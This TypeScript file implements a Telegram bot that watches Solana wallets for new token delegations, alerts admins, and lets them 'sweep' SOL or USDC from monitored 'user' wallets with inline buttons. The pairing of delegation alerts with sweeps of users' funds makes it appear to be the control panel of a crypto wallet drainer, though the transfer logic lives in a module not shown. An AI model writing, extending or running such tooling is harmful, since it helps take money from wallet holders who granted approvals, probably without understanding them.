// ---- FIX: Force IPv4 and increase undici timeouts globally ----
process.env.NODE_OPTIONS = '--dns-result-order=ipv4first';
import { setGlobalDispatcher, Agent } from 'undici';
const agent = new Agent({
  connectTimeout: 120000,
  bodyTimeout: 120000,
  headersTimeout: 120000,
});
setGlobalDispatcher(agent);

import TelegramBotApi, { InlineKeyboardMarkup } from 'node-telegram-bot-api';
import { Connection, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { AgentDatabase } from './database.js';
import { TransferService } from './transfer.js';
import { logger } from './utils.js';
import dotenv from 'dotenv';

dotenv.config();

// Constants
const WSOL_MINT = "So11111111111111111111111111111111111111112";
const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";

interface TelegramConfig {
  token: string;
  adminUserIds: string[];
}

// State for interactive prompts
interface ChatState {
  action: 'balance' | 'sweep' | 'setnickname' | null;
  wallet?: string;
  step?: 'awaiting_nickname' | 'awaiting_token' | null;
}

export class TelegramBot {
  private bot: TelegramBotApi;
  private transferService: TransferService;
  private connection: Connection;
  private db: AgentDatabase;
  private adminUserIds: string[];
  private chatStates: Map<number, ChatState> = new Map();
  private walletSelectionMap: Map<string, { wallet: string; action: string }> = new Map();
  private selectionIdCounter: number = 0;

  constructor(
    db: AgentDatabase,
    transferService: TransferService,
    config: TelegramConfig | undefined,
    connection: Connection
  ) {
    this.db = db;
    this.transferService = transferService;
    this.connection = connection;

    const token = config?.token || process.env.TELEGRAM_TOKEN || '';
    this.adminUserIds = config?.adminUserIds ||
                        (process.env.TELEGRAM_ADMIN_USER_IDS || '').split(',').filter(Boolean);

    if (!token) {
      logger.error('❌ Telegram token is missing! Set TELEGRAM_TOKEN in .env');
      throw new Error('Telegram token is required');
    }

    logger.info(`🤖 Initializing Telegram bot with token: ${token.substring(0, 10)}...`);
    logger.info(`👥 Admin users: ${this.adminUserIds.join(', ') || 'None'}`);

    this.bot = new TelegramBotApi(token, {
      polling: {
        timeout: 30,
      },
      request: {
        timeoutMs: 120000, // FIXED: was 'timeout'
      },
    });

    this.setupHandlers();
    logger.info('🤖 Telegram bot initialized successfully');
  }

  private async setCommands(): Promise<void> {
    try {
      await this.bot.setMyCommands([
        { command: 'ping', description: 'Check bot status' },
        { command: 'balance', description: 'Check wallet balance (Admin only)' },
        { command: 'listusers', description: 'List monitored wallets (Admin only)' },
        { command: 'admin', description: 'Show admin wallet info (Admin only)' },
        { command: 'sweep', description: 'Sweep funds from user (Admin only)' },
        { command: 'setnickname', description: 'Rename a wallet (Admin only)' },
        { command: 'help', description: 'Show this help message' },
      ]);
      logger.info('✅ Telegram commands registered');
    } catch (error) {
      logger.error('Failed to register Telegram commands:', error);
    }
  }

  private setupHandlers(): void {
    // ---- COMMAND HANDLERS (all wrapped with try/catch) ----
    this.bot.onText(/^\/ping$/, (msg) => {
      this.sendMessage(msg.chat.id, 'Pong! 🏓 Bot is active.', 'Markdown');
    });

    this.bot.onText(/^\/balance(?:\s+(\S+))?$/, async (msg, match) => {
      try {
        if (!this.isAdmin(msg.chat.id)) {
          this.sendMessage(msg.chat.id, '🚫 Permission denied. Admin only.', 'Markdown');
          return;
        }
        const query = match?.[1];
        if (query) {
          await this.handleBalance(msg.chat.id, query);
        } else {
          await this.showWalletList(msg.chat.id, 'balance');
        }
      } catch (error) {
        logger.error('Error in /balance handler:', error);
        this.sendMessage(msg.chat.id, `❌ Error: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
      }
    });

    this.bot.onText(/^\/listusers$/, async (msg) => {
      try {
        if (!this.isAdmin(msg.chat.id)) {
          this.sendMessage(msg.chat.id, '🚫 Permission denied. Admin only.', 'Markdown');
          return;
        }
        await this.handleListUsers(msg.chat.id);
      } catch (error) {
        logger.error('Error in /listusers handler:', error);
        this.sendMessage(msg.chat.id, `❌ Error: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
      }
    });

    this.bot.onText(/^\/admin$/, async (msg) => {
      try {
        if (!this.isAdmin(msg.chat.id)) {
          this.sendMessage(msg.chat.id, '🚫 Permission denied. Admin only.', 'Markdown');
          return;
        }
        await this.handleAdmin(msg.chat.id);
      } catch (error) {
        logger.error('Error in /admin handler:', error);
        this.sendMessage(msg.chat.id, `❌ Error: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
      }
    });

    this.bot.onText(/^\/sweep(?:\s+(\S+))?$/, async (msg, match) => {
      try {
        if (!this.isAdmin(msg.chat.id)) {
          this.sendMessage(msg.chat.id, '🚫 Permission denied. Admin only.', 'Markdown');
          return;
        }
        const address = match?.[1];
        if (address) {
          await this.showTokenChoice(msg.chat.id, address);
        } else {
          await this.showWalletList(msg.chat.id, 'sweep');
        }
      } catch (error) {
        logger.error('Error in /sweep handler:', error);
        this.sendMessage(msg.chat.id, `❌ Error: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
      }
    });

    this.bot.onText(/^\/setnickname(?:\s+(\S+))?$/, async (msg, match) => {
      try {
        if (!this.isAdmin(msg.chat.id)) {
          this.sendMessage(msg.chat.id, '🚫 Permission denied. Admin only.', 'Markdown');
          return;
        }
        const identifier = match?.[1];
        if (identifier) {
          const chatId = msg.chat.id;
          let walletAddress: string;
          try {
            new PublicKey(identifier);
            walletAddress = identifier;
          } catch {
            const wallets = await this.db.getMonitoredWallets();
            const found = wallets.find(w => w.nickname === identifier);
            if (!found) {
              this.sendMessage(chatId, `❌ No wallet found with identifier "${identifier}".`, 'Markdown');
              return;
            }
            walletAddress = found.publicKey;
          }
          this.chatStates.set(chatId, { action: 'setnickname', wallet: walletAddress, step: 'awaiting_nickname' });
          this.sendMessage(chatId, `✏️ Please send the new nickname for wallet:\n\`${walletAddress}\``, 'Markdown');
        } else {
          await this.showWalletList(msg.chat.id, 'setnickname');
        }
      } catch (error) {
        logger.error('Error in /setnickname handler:', error);
        this.sendMessage(msg.chat.id, `❌ Error: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
      }
    });

    // ---- START and HELP (plain text) ----
    this.bot.onText(/^\/start$/, (msg) => {
      this.sendMessage(msg.chat.id,
`🤖 Solana Monitor Bot

Available commands:
/ping - Check bot status
/balance - Show wallet list to check balance
/listusers - List monitored wallets
/admin - Show admin wallet info
/sweep - Show wallet list to sweep funds
/setnickname - Show wallet list to rename a wallet
/help - Show this message`, '');
    });

    this.bot.onText(/^\/help$/, (msg) => {
      logger.info(`/help command received from ${msg.chat.id}`);
      this.sendMessage(msg.chat.id,
`🤖 Available Commands:

General:
/ping - Check bot status
/balance - Pick a wallet to check balance (Admin only)
/listusers - List monitored wallets (Admin only)

Admin:
/admin - Show admin wallet info
/sweep - Pick a wallet & token to sweep funds (Admin only)
/setnickname - Pick a wallet to rename (Admin only)

Alerts:
The bot will automatically send alerts for:
• New delegations detected
• Balance increases
• Contract transfers`, '');
    });

    // ---- CALLBACK QUERY HANDLER ----
    this.bot.on('callback_query', async (callbackQuery) => {
      try {
        const data = callbackQuery.data;
        if (!data) return;
        const chatId = callbackQuery.message?.chat.id;
        if (!chatId) return;
        

        // Handle wallet selection (short IDs)
        if (data.startsWith('sel_')) {
          const parts = data.split('_');
          const action = parts[1]; // balance, sweep, setnickname
          const id = parts.slice(2).join('_'); // the unique ID
          const entry = this.walletSelectionMap.get(id);
          if (!entry) {
            await this.bot.answerCallbackQuery(callbackQuery.id, { text: 'Selection expired. Please run the command again.' });
            return;
          }
          const wallet = entry.wallet;
          // Clean up the map entry
          this.walletSelectionMap.delete(id);

          // Process the action
          if (action === 'balance') {
            await this.handleBalance(chatId, wallet);
          } else if (action === 'sweep') {
            await this.showTokenChoice(chatId, wallet);
          } else if (action === 'setnickname') {
            this.chatStates.set(chatId, { action: 'setnickname', wallet, step: 'awaiting_nickname' });
            await this.bot.sendMessage(chatId, `✏️ Please send the new nickname for wallet:\n\`${wallet}\``, { parse_mode: 'Markdown' });
          }
          await this.bot.answerCallbackQuery(callbackQuery.id);
          return;
        }

        // Handle token choice (already short – stays the same)
        if (data.startsWith('choose_token_')) {
          const parts = data.split('_');
          const wallet = parts[2];
          const token = parts[3];
          await this.handleSweep(chatId, wallet, token);
          await this.bot.answerCallbackQuery(callbackQuery.id);
          return;
        }

        await this.bot.answerCallbackQuery(callbackQuery.id, { text: 'Action not recognized' });
      } catch (error) {
        logger.error('Error in callback_query handler:', error);
        try {
          await this.bot.answerCallbackQuery(callbackQuery.id, { text: 'Error processing action' });
        } catch (_) {}
      }
    });

    // ---- TEXT HANDLER (for nickname input) ----
    this.bot.onText(/^(.+)$/, async (msg, match) => {
      try {
        const chatId = msg.chat.id;
        const text = match?.[1];
        if (!text) return;
        if (text.startsWith('/')) return;

        const state = this.chatStates.get(chatId);
        if (!state) return;

        if (state.action === 'setnickname' && state.step === 'awaiting_nickname') {
          const wallet = state.wallet!;
          const nickname = text.trim();
          if (nickname.length > 0) {
            await this.db.addMonitoredWallet({
              publicKey: wallet,
              nickname: nickname,
              isActive: true,
                createdAt: new Date()
            });
            this.chatStates.delete(chatId);
            await this.bot.sendMessage(chatId, `✅ Wallet \`${wallet}\` is now known as **${nickname}**.`, { parse_mode: 'Markdown' });
          } else {
            await this.bot.sendMessage(chatId, '❌ Nickname cannot be empty. Please send a valid name.');
          }
          return;
        }
      } catch (error) {
        logger.error('Error in text handler:', error);
        this.sendMessage(msg.chat.id, `❌ Error: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
      }
    });

    // ---- FALLBACK for unknown commands ----
    this.bot.onText(/^\/.*$/, (msg) => {
      this.sendMessage(msg.chat.id, '❓ Unknown command. Type /help for available commands.', '');
    });
  }

  // ---- Helper: Show wallet list with inline buttons ----
  private async showWalletList(chatId: number, action: 'balance' | 'sweep' | 'setnickname'): Promise<void> {
    try {
      const wallets = await this.db.getMonitoredWallets();
      if (wallets.length === 0) {
        this.sendMessage(chatId, 'No monitored wallets found.', 'Markdown');
        return;
      }

      const buttons = wallets.slice(0, 15).map(w => {
        this.selectionIdCounter++;
        const id = `sel_${action}_${this.selectionIdCounter}`;
        this.walletSelectionMap.set(String(this.selectionIdCounter), { wallet: w.publicKey, action });
        const label = w.nickname ? `${w.nickname} (${w.publicKey.slice(0, 8)}...)` : w.publicKey.slice(0, 12);
        return [{ text: label, callback_data: id }];
      });

      const keyboard: InlineKeyboardMarkup = { inline_keyboard: buttons };

      const actionMap: Record<string, string> = {
        balance: 'check balance',
        sweep: 'sweep funds from',
        setnickname: 'rename'
      };

      await this.bot.sendMessage(chatId, `Select a wallet to ${actionMap[action]}:`, {
        reply_markup: keyboard
      });
    } catch (error) {
      logger.error('Error in showWalletList:', error);
      this.sendMessage(chatId, `❌ Error: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
    }
  }

  // ---- Helper: Show token choice for sweep ----
  private async showTokenChoice(chatId: number, wallet: string): Promise<void> {
    try {
      const keyboard: InlineKeyboardMarkup = {
        inline_keyboard: [
          [{ text: 'SOL', callback_data: `choose_token_${wallet}_SOL` }],
          [{ text: 'USDC', callback_data: `choose_token_${wallet}_USDC` }]
        ]
      };
      await this.bot.sendMessage(chatId, `Select token to sweep from wallet:\n\`${wallet}\``, {
        parse_mode: 'Markdown',
        reply_markup: keyboard
      });
    } catch (error) {
      logger.error('Error in showTokenChoice:', error);
      this.sendMessage(chatId, `❌ Error: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
    }
  }

  // ---- Admin check ----
  private isAdmin(chatId: number): boolean {
    return this.adminUserIds.includes(String(chatId));
  }

  // ---- Send message helper ----
  private async sendMessage(chatId: number, text: string, parseMode: 'Markdown' | 'HTML' | '' = 'Markdown'): Promise<void> {
    try {
      const options: any = {};
      if (parseMode) options.parse_mode = parseMode;
      await this.bot.sendMessage(chatId, text, options);
    } catch (error) {
      if (error && typeof error === 'object' && 'cause' in error && (error as any).cause?.code === 'ETIMEDOUT') {
        logger.warn(`Timeout sending message to ${chatId} – will retry on next event`);
      } else {
        logger.error(`Failed to send message to ${chatId}:`, error);
      }
    }
  }

  // ========== COMMAND HANDLERS ==========

  private async handleBalance(chatId: number, query: string): Promise<void> {
    try {
      let walletAddress: string;

      try {
        new PublicKey(query);
        walletAddress = query;
      } catch {
        const wallets = await this.db.getMonitoredWallets();
        const found = wallets.find(w => w.nickname === query);
        if (!found) {
          await this.sendMessage(chatId, `❌ No wallet found with nickname "${query}".`, 'Markdown');
          return;
        }
        walletAddress = found.publicKey;
      }

      const pubKey = new PublicKey(walletAddress);
      const solBalance = await this.connection.getBalance(pubKey);
      const sol = solBalance / LAMPORTS_PER_SOL;

      const tokenAccounts = await this.connection.getParsedTokenAccountsByOwner(pubKey, {
        programId: TOKEN_PROGRAM_ID
      });

      let tokenSummary = '';
      tokenAccounts.value.forEach((item: any) => {
        const info = item.account.data.parsed.info;
        const uiAmount = info.tokenAmount.uiAmount;
        if (uiAmount > 0) {
          let symbol = info.mint === USDC_MINT ? 'USDC' : (info.mint === WSOL_MINT ? 'wSOL' : 'Token');
          tokenSummary += `• **${symbol}:** ${uiAmount.toLocaleString()}\n`;
        }
      });

      if (!tokenSummary) tokenSummary = 'No tokens found.';

      const message = `💰 **Wallet Balance**\n\n` +
        `**Address:**\n\`${walletAddress}\`\n\n` +
        `**Native Balance:** ${sol.toFixed(4)} SOL\n\n` +
        `**Token Balances:**\n${tokenSummary}`;

      await this.sendMessage(chatId, message, 'Markdown');
      this.chatStates.delete(chatId);
    } catch (error: any) {
      await this.sendMessage(chatId, `❌ Error fetching balance: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
    }
  }

  private async handleListUsers(chatId: number): Promise<void> {
    try {
      const wallets = await this.db.getMonitoredWallets();
      if (wallets.length === 0) {
        await this.sendMessage(chatId, 'No monitored wallets found.', 'Markdown');
        return;
      }

      let message = `📋 **Monitored Wallets (${wallets.length})**\n\n`;
      const displayWallets = wallets.slice(0, 10);
      displayWallets.forEach((w, i) => {
        const status = w.isActive ? '🟢 Active' : '🔴 Inactive';
        const name = w.nickname || `User ${i+1}`;
        message += `**${name}**\nWallet: \`${w.publicKey}\`\nStatus: ${status}\n\n`;
      });

      if (wallets.length > 10) {
        message += `\n_Showing 10 of ${wallets.length} wallets._`;
      }

      await this.sendMessage(chatId, message, 'Markdown');
    } catch (error: any) {
      await this.sendMessage(chatId, `❌ Error: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
    }
  }

  private async handleAdmin(chatId: number): Promise<void> {
    try {
      const adminKey = this.transferService.getAdminPublicKey();
      const pubKey = new PublicKey(adminKey);
      const balance = await this.connection.getBalance(pubKey);
      const sol = balance / LAMPORTS_PER_SOL;

      const tokenAccounts = await this.connection.getParsedTokenAccountsByOwner(pubKey, {
        programId: TOKEN_PROGRAM_ID
      });

      let tokenText = '';
      tokenAccounts.value.forEach((item: any) => {
        const info = item.account.data.parsed.info;
        const uiAmount = info.tokenAmount.uiAmount;
        if (uiAmount > 0) {
          let symbol = info.mint === WSOL_MINT ? 'wSOL' : (info.mint === USDC_MINT ? 'USDC' : 'Unknown');
          tokenText += `• **${symbol}:** ${uiAmount.toLocaleString()}\n`;
        }
      });

      if (!tokenText) tokenText = 'No tokens found.';

      const message = `🤖 **Bot Admin Wallet**\n\n` +
        `**Address:**\n\`${adminKey}\`\n\n` +
        `**Native Balance:** ${sol.toFixed(4)} SOL\n\n` +
        `**Token Balances:**\n${tokenText}\n\n` +
        `_This wallet pays for transaction fees._`;

      await this.sendMessage(chatId, message, 'Markdown');
    } catch (error: any) {
      await this.sendMessage(chatId, `❌ Error: ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
    }
  }

  private async handleSweep(chatId: number, userAddress: string, tokenSymbol: string): Promise<void> {
    try {
      const targetMint = tokenSymbol === 'USDC' ? USDC_MINT : WSOL_MINT;

      await this.sendMessage(chatId, `⏳ **Sweeping ${tokenSymbol}...**\nTarget: \`${userAddress}\``, 'Markdown');

      const txSignature = await this.transferService.sweepUser(userAddress, targetMint);

      const message = `✅ **Sweep Successful!**\n\n` +
        `**Token:** ${tokenSymbol}\n` +
        `**User:** \`${userAddress}\`\n` +
        `**Transaction:** [View on Explorer](https://explorer.solana.com/tx/${txSignature}?cluster=devnet)`;

      await this.sendMessage(chatId, message, 'Markdown');
      this.chatStates.delete(chatId);
    } catch (error: any) {
      await this.sendMessage(chatId, `❌ **Sweep Failed:** ${error instanceof Error ? error.message : String(error)}`, 'Markdown');
    }
  }

  // ========== PUBLIC METHODS ==========

  async login(): Promise<void> {
    logger.info('🤖 Telegram bot is polling for messages');
    await this.setCommands();
  }

  disconnect(): void {
    this.bot.stopPolling();
    logger.info('🤖 Telegram bot disconnected');
  }

  async registerCommands(): Promise<void> {
    // Already handled in login
  }

  async sendAlert(type: string, data: any): Promise<void> {
    try {
      const admins = this.adminUserIds;
      if (admins.length === 0) {
        logger.warn('No admin users configured for Telegram alerts');
        return;
      }

      let message = '';
      let keyboard: InlineKeyboardMarkup | undefined;

      if (type === 'delegation-detected') {
        const tokenName = data.mint === WSOL_MINT ? 'wSOL' : (data.mint === USDC_MINT ? 'USDC' : 'Unknown');
        message = `🚨 **New Delegation Detected!**\n\n` +
          `**Wallet:** \`${data.wallet}\`\n` +
          `**Token:** ${tokenName}\n` +
          `**Expiration:** ${data.expiration ? new Date(data.expiration * 1000).toLocaleString() : 'N/A'}`;
        keyboard = {
          inline_keyboard: [
            [{ text: '✏️ Set Nickname', callback_data: `setnick_${data.wallet}` }]
          ]
        };
      } else if (type === 'balance-increase') {
        const isUsdc = data.mint === USDC_MINT;
        const decimals = isUsdc ? 6 : 9;
        const formattedAmount = Number(data.amount) / Math.pow(10, decimals);
        message = `💰 **Balance Increase Detected!**\n\n` +
          `**Wallet:** \`${data.wallet}\`\n` +
          `**Amount:** +${formattedAmount.toFixed(isUsdc ? 2 : 4)} ${isUsdc ? 'USDC' : 'SOL'}`;
      } else if (type === 'contract-transfer') {
        message = `🔄 **Contract Transfer Detected!**\n\n` +
          `**Wallet:** \`${data.wallet}\`\n` +
          `**Amount:** ${data.amount}`;
      }

      if (!message) return;

      for (const adminId of admins) {
        try {
          await this.bot.sendMessage(adminId, message, {
            parse_mode: 'Markdown',
            reply_markup: keyboard
          });
        } catch (error) {
          if (error && typeof error === 'object' && 'cause' in error && (error as any).cause?.code === 'ETIMEDOUT') {
            logger.warn(`Timeout sending alert to ${adminId} – will retry on next event`);
          } else {
            logger.error(`Failed to send alert to ${adminId}:`, error);
          }
        }
      }
    } catch (error) {
      logger.error('Failed to send Telegram alert:', error);
    }
  }
}